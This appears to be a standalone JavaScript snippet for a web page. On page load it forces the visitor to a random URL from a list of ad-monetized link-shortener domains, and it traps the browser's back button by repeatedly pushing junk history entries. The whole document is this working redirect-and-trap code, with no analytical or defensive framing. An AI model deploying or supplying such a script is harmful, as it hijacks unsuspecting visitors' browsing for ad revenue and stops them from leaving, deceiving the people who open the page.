var urls = ["https://besargaji.com/G3XzOqTgFX",
            "https://link.bicolink.net/ZfWI",
            "https://arahlink.id/8XufJ3wv",
            "https://ouo.io/dMKixRp",
            "https://adbull.me/1t7Md",
            "https://to.aoutoqw.xyz/SQk9LIy",
            "https://go.aoutoqw.xyz/0yqHv"];


function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

